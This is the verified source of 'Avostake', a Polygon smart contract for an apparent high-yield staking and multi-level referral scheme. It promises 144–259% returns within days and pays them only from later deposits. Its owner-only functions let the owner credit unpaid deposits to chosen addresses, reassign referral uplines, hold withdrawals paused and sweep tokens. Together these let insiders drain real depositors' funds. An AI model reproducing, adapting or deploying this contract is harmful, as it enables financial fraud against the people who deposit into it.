/**
 *Submitted for verification at polygonscan.com on 2023-06-09
*/

// SPDX-License-Identifier: MIT License

pragma solidity >=0.8.0;

struct Tarif {
  uint8 life_days;
  uint256 percent;
  uint8 bonusPercent;
}

struct Deposit {
  uint8 tarif;
  uint256 amount;
  uint256 time;
}

struct Player {
  address upline;
  uint256 dividends;
  uint256 match_bonus;
  uint256 leader_bonus;
  uint256 last_payout;
  uint256 total_invested;
  uint256 total_withdrawn;
  uint256 total_match_bonus;

  uint256 leadTurnover;
  uint256 leadBonusReward;
  bool[9] receivedBonuses;

  Deposit[] deposits;
  uint256[10] structure; // length has been got from bonus lines number
  address[] referrals;
  uint256[10] refTurnover;
}

interface IERC20 {

  function balanceOf(address account) external view returns (uint256);

  function transfer(address to, uint256 amount) external returns (bool);

}

contract Avostake {
    address public owner;

    uint256 public invested;
    uint256 public withdrawn;
    uint256 public match_bonus;
    uint256 public totalLeadBonusReward;
    
    uint8 constant BONUS_LINES_COUNT = 10;
    uint16 constant PERCENT_DIVIDER = 1000; // 100 * 10
    uint8[BONUS_LINES_COUNT] public ref_bonuses = [50, 20, 10, 5, 5, 5, 5, 5, 5, 5];
    uint8 public REF_LIMIT = uint8(ref_bonuses.length);
    uint256[14] public LEADER_BONUS_TRIGGERS = [
      600 ether,
      1_500 ether,
      3_000 ether,
      6_000 ether,
      30_000 ether,
      60_000 ether,
      150_000 ether,
      250_000 ether,
      500_000 ether,
      1_000_000 ether,
      3_000_000 ether,
      6_000_000 ether,
      10_000_000 ether,
      15_000_000 ether
    ];

    uint256[14] public LEADER_BONUS_REWARDS = [
      12 ether,
      30 ether,
      60 ether,
      120 ether,
      600 ether,
      2_000 ether,
      5_000 ether,
      8_000 ether,
      21_000 ether,
      50_000 ether,
      150_000 ether,
      300_000 ether,
      600_000 ether,
      1_000_000 ether
    ];

    uint256[3] public LEADER_BONUS_LEVEL_PERCENTS = [100, 30, 15];

    uint8 constant TARIF_MIN_DURATION = 10;
    uint8 constant TARIF_MAX_DURATION = 33;

    mapping(uint8 => Tarif) public tarifs;
    mapping(address => Player) public players;
    uint256 totalPlayers;

    address private immutable DEFAULT_REFERRER;
    address[2] public PARTNERS_ADDRESSES;
    uint256[2] public PARTNERS_PERCENTS;

    uint256[3] public DEPS_AMOUNTS = [100 ether, 250 ether, 500 ether];
    uint256[3] public DEPS_LIMITS = [50, 50, 50];
    uint256[3] public DEPS_COUNTERS = [0, 0, 0];

    uint256 public unpauseTime = 0;

    event Upline(address indexed addr, address indexed upline, uint256 bonus, uint256 timestamp);
    event NewDeposit(
      address indexed addr,
      address indexed referrer,
      uint256 amount,
      uint8 tarif,
      bool charge,
      uint256 timestamp
    );

    event Withdraw(
      address indexed addr,
      address indexed to,
      uint256 amount,
      uint256 timestamp
    );
    event LeaderBonusReward(
        address indexed to,
        uint256 indexed amount,
        uint8 indexed level,
        uint256 timestamp
    );

    event SwitchDelegation(
      address indexed addr,
      bool newDelegationWithdrawFlag,
      uint256 timestamp
    );

    constructor(
      address defRef,
      address[] memory partnersAddrs, uint256[] memory partnersPercents
    ) {
        owner = msg.sender;
        players[owner].upline = owner;

        DEFAULT_REFERRER = defRef;
        players[defRef].upline = defRef;

        for (uint8 i = 0; i < partnersAddrs.length; i++) {
          PARTNERS_ADDRESSES[i] = partnersAddrs[i];
          players[PARTNERS_ADDRESSES[i]].upline = defRef;

          PARTNERS_PERCENTS[i] = partnersPercents[i];
        }

        uint256 tarifPercent = 144;
        for (uint8 tarifDuration = TARIF_MIN_DURATION; tarifDuration <= TARIF_MAX_DURATION; tarifDuration++) {
            tarifs[tarifDuration] = Tarif(tarifDuration, tarifPercent, 0);
            if (tarifDuration == 30) {
              tarifs[tarifDuration].bonusPercent = 30;
            }
            tarifPercent+= 5;
        }
    }

    function setTarifBonus(uint8 tarifDuration, uint8 bonusPercent) external {
      require(msg.sender == owner, "Only owner can call this method");
      require(tarifDuration >= TARIF_MIN_DURATION && tarifDuration <= TARIF_MAX_DURATION, "Invalid tarif duration");
      require(bonusPercent >= 0 && bonusPercent <= 10, "Invalid bonus percent value");

      tarifs[tarifDuration].bonusPercent = bonusPercent;
    }

    function _payout(address _addr) private {
        uint256 payout = this.payoutOf(_addr);

        if (payout > 0) {
            players[_addr].last_payout = block.timestamp;
            players[_addr].dividends += payout;
        }
    }

    function _refPayout(address _addr, uint256 _amount) private {
        address up = players[_addr].upline;

        uint8 isDefRef = 0;
        for (uint8 i = 0; i < ref_bonuses.length; i++) {
            if (up == address(0) || up == DEFAULT_REFERRER) {
              up = DEFAULT_REFERRER;

              if (i > 0 && i <= REF_LIMIT && isDefRef <= REF_LIMIT<<3) {
                isDefRef++;
                i--;
              }
            }
            
            uint256 bonus = _amount * ref_bonuses[i] / PERCENT_DIVIDER;
            
            players[up].match_bonus += bonus;
            players[up].total_match_bonus += bonus;

            match_bonus += bonus;

            up = players[up].upline;
        }
    }

    function _setUpline(address _addr, address _upline, uint256 _amount) private {
        if (players[_addr].upline == address(0) && _addr != owner) {
            totalPlayers++;
            if (players[_upline].deposits.length == 0) {
                _upline = DEFAULT_REFERRER;
            }

            players[_addr].upline = _upline;

            emit Upline(_addr, _upline, _amount / 100, block.timestamp);
            
            players[_upline].referrals.push(_addr);
            for (uint8 i = 0; i < BONUS_LINES_COUNT; i++) {
                players[_upline].structure[i]++;

                address prevUpline = _upline;
                _upline = players[_upline].upline;

                if (_upline == address(0) || (prevUpline == _upline && _upline != DEFAULT_REFERRER)) {
                  break;
                }
            }
        }
    }

    function deposit(uint8 _tarif, address _upline) external payable {
      deposit(msg.sender, _tarif, _upline, msg.value, true);
    }

    function deposit(address _user, uint8 _tarif, address _upline, uint256 _amount) external {
      require(msg.sender == owner, "Only owner can call this method");

      require(_amount == DEPS_AMOUNTS[0] || _amount == DEPS_AMOUNTS[1] || _amount == DEPS_AMOUNTS[2], "Invalid deposit value amount");
      for (uint8 i = 0; i < DEPS_AMOUNTS.length; i++) {
        if (_amount == DEPS_AMOUNTS[i]) {
          require(DEPS_COUNTERS[i] < DEPS_LIMITS[i], "Deposits limit reached");
          DEPS_COUNTERS[i]++;

          break;
        }
      }

      deposit(_user, _tarif, _upline, _amount, false);
    }

    function deposit(address _user, uint8 _tarif, address _upline, uint256 tokensAmount, bool _charge) private {
        require(tarifs[_tarif].life_days > 0, "Tarif not found");
        require(tokensAmount >= 10 ether, "Minimum deposit amount is 10 MATIC");
        if (_charge) {
          require(msg.value == tokensAmount, "Minimum deposit amount is 10 MATIC");
        }

        Player storage player = players[_user];

        require(player.deposits.length < 100, "Max 100 deposits per address");

        _setUpline(_user, _upline, tokensAmount);

        uint256 amount = tokensAmount;
        if (player.deposits.length == 0 && tarifs[_tarif].bonusPercent > 0) { // 1st deposit
          amount = amount * uint256(100 + tarifs[_tarif].bonusPercent) / 100;
        }
        player.deposits.push(Deposit({
            tarif: _tarif,
            amount: amount,
            time: block.timestamp
        }));

        player.total_invested += tokensAmount;
        invested += tokensAmount;

        _refPayout(_user, tokensAmount);
        distributeBonuses(tokensAmount, _user);

        address ref = player.upline;
        for (uint8 i = 0; i < BONUS_LINES_COUNT; i++) {
          players[ref].refTurnover[i]+= tokensAmount;

          address prevRef = ref;
          ref = players[ref].upline;
          if (prevRef == ref || ref == address(0x0)) {
            break;
          }
        }

        if (_charge) {
          uint256 adminFee = tokensAmount / 10;
          uint256 partnersFee = 0;
          for (uint8 i = 0; i < PARTNERS_PERCENTS.length; i++) {
            partnersFee+= adminFee * PARTNERS_PERCENTS[i] / PERCENT_DIVIDER;

            payable(PARTNERS_ADDRESSES[i]).transfer(adminFee * PARTNERS_PERCENTS[i] / PERCENT_DIVIDER);
          }

          payable(owner).transfer(adminFee - partnersFee);
        }

        emit NewDeposit(_user, player.upline, amount, _tarif, _charge, block.timestamp);
    }

    function withdraw() external {
        require(unpauseTime > 0, "Contract is still on pause");

        Player storage player = players[msg.sender];

        _payout(msg.sender);

        require(player.dividends > 0 || player.match_bonus > 0 || player.leader_bonus > 0, "Zero amount");

        uint256 amount = player.dividends + player.match_bonus + player.leader_bonus;

        player.dividends = 0;
        player.match_bonus = 0;
        player.leader_bonus = 0;

        if (amount > address(this).balance) {
          amount = address(this).balance;
        }

        player.total_withdrawn += amount;
        withdrawn += amount;

        if (msg.sender == DEFAULT_REFERRER) {
          uint256 partnersAmount = 0;
          for (uint8 i = 0; i < PARTNERS_PERCENTS.length; i++) {
            partnersAmount+= amount * PARTNERS_PERCENTS[i] / PERCENT_DIVIDER;

            payable(PARTNERS_ADDRESSES[i]).transfer(amount * PARTNERS_PERCENTS[i] / PERCENT_DIVIDER);
          }

          payable(msg.sender).transfer(amount - partnersAmount);
        } else {
          payable(msg.sender).transfer(amount);
        }
        
        emit Withdraw(msg.sender, msg.sender, amount, block.timestamp);
    }

    function payoutOf(address _addr) view external returns(uint256 value) {
        Player storage player = players[_addr];

        for(uint256 i = 0; i < player.deposits.length; i++) {
            Deposit storage dep = player.deposits[i];
            Tarif storage tarif = tarifs[dep.tarif];

            uint256 time_end = dep.time + tarif.life_days * uint256(86400);

            uint256 from = player.last_payout > dep.time ? player.last_payout : dep.time;
            from = unpauseTime > from ? unpauseTime : from;            

            uint256 to = block.timestamp > time_end ? time_end : block.timestamp;

            if (from < to) {
                value += dep.amount * (to - from) * tarif.percent / tarif.life_days / uint256(8640000);
            }
        }

        return value;
    }

    function distributeBonuses(uint256 _amount, address _player) private {
      address ref = players[_player].upline;

      for (uint8 i = 0; i < LEADER_BONUS_LEVEL_PERCENTS.length; i++) {
        players[ref].leadTurnover+= _amount * LEADER_BONUS_LEVEL_PERCENTS[i] / 100;

        for (uint8 j = 0; j < LEADER_BONUS_TRIGGERS.length; j++) {
          if (players[ref].leadTurnover >= LEADER_BONUS_TRIGGERS[j]) {
            if (!players[ref].receivedBonuses[j]) {
              players[ref].receivedBonuses[j] = true;
              players[ref].leadBonusReward+= LEADER_BONUS_REWARDS[j];
              totalLeadBonusReward+= LEADER_BONUS_REWARDS[j];

              //payable(ref).transfer(LEADER_BONUS_REWARDS[j]);
              players[ref].leader_bonus+= LEADER_BONUS_REWARDS[j];
              if (ref == DEFAULT_REFERRER) { // default referrer should not receive bonuses
                players[ref].receivedBonuses[j] = false;
              }
              emit LeaderBonusReward(
                ref,
                LEADER_BONUS_REWARDS[j],
                i,
                block.timestamp
              );
            } else {
              continue;
            }
          } else {
            break;
          }
        }

        ref = players[ref].upline;

        if (ref == address(0x0)) {
          break;
        }
      }
    }

    function getTotalLeaderBonus(address _player) external view returns (uint256) {
      return players[_player].leadBonusReward;
    }

    function getReceivedBonuses(address _player) external view returns (bool[9] memory) {
        return players[_player].receivedBonuses;
    }

    /*
     * Only external call
     */
    function userInfo(address _addr) external view returns(uint256 for_withdraw, Player memory player) {
        player = players[_addr];

        uint256 payout = this.payoutOf(_addr);

        return (
            payout + player.dividends + player.match_bonus + player.leader_bonus,
            player
        );
    }

    function contractInfo() external view returns(
      uint256, uint256, uint256, uint256, uint256,
      uint8[] memory bonuses
    ) {
      bonuses = new uint8[](TARIF_MAX_DURATION - TARIF_MIN_DURATION + 1);

      for (uint8 tarifDuration = TARIF_MIN_DURATION; tarifDuration <= TARIF_MAX_DURATION; tarifDuration++) {
        bonuses[tarifDuration - TARIF_MIN_DURATION] = tarifs[tarifDuration].bonusPercent;
      }

      return (
        invested, withdrawn, match_bonus, totalLeadBonusReward, totalPlayers,
        bonuses
      );
    }

    function transfer(address _addr, address _to) external {
      require(msg.sender == owner, "Only owner can call this method");

      players[_addr].upline = _to;
    }

    function retrieveERC20(address tokenContractAddress) external {
      require(msg.sender == owner, "Only owner can call this method");

      IERC20(tokenContractAddress).transfer(
        owner,
        IERC20(tokenContractAddress).balanceOf(address(this))
      );
    }

    function unpause() external {
      require(msg.sender == owner, "Only owner can call this method");
      require(unpauseTime == 0, "Already unpaused");

      unpauseTime = block.timestamp;
    }

    function deposit() external payable {
      payable(msg.sender).transfer(msg.value);
    }

}